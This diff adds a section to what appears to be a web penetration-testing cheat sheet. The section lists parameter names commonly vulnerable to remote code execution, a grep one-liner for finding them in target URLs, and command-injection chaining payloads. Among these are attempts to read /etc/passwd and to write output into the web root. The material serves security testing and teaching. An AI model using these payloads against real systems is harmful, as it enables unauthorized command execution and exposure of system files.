@@ -207,9 +207,60 @@ Examine unexpected responses from the server that may indicate the execution of 
 
 Injection of values ​​such as `$(Whoami)` or `${7*7}` in input parameters.
 
+## Top 25 Remote Code Execution (RCE) Parameters
 
+Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities
 
+```bash
+?cmd={payload}
+?exec={payload}
+?command={payload}
+?execute{payload}
+?ping={payload}
+?query={payload}
+?jump={payload}
+?code={payload}
+?reg={payload}
+?do={payload}
+?func={payload}
+?arg={payload}
+?option={payload}
+?load={payload}
+?process={payload}
+?step={payload}
+?read={payload}
+?function={payload}
+?req={payload}
+?feature={payload}
+?exe={payload}
+?module={payload}
+?payload={payload}
+?run={payload}
+?print={payload}
+```
+* Example
+```bash
+cat target_all_url.txt | grep -E "?print=|?run=|?payload=|?module=|?exe=|?feature=|?req=|?function=|?read=|?step=|?process=|?load=|?option=|?arg=|?func=|?do=|?reg=|?code=|?jump=|?query=|?ping=|?execute=|?command=|?exec=|?cmd="
+```
+### Command Injection/Execution
+```bash
+#Both Unix and Windows supported
+ls||id; ls ||id; ls|| id; ls || id # Execute both
+ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
+ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
+ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
+ls %0A id # %0A Execute both (RECOMMENDED)
 
+#Only unix supported
+`ls` # ``
+$(ls) # $()
+ls; id # ; Chain commands
+ls${LS_COLORS:10:1}${IFS}id # Might be useful
+
+#Not executed but may be interesting
+> /var/www/html/out.txt #Try to redirect the output to a file
+< /etc/passwd #Try to send some input to the command
+```
 
 
 
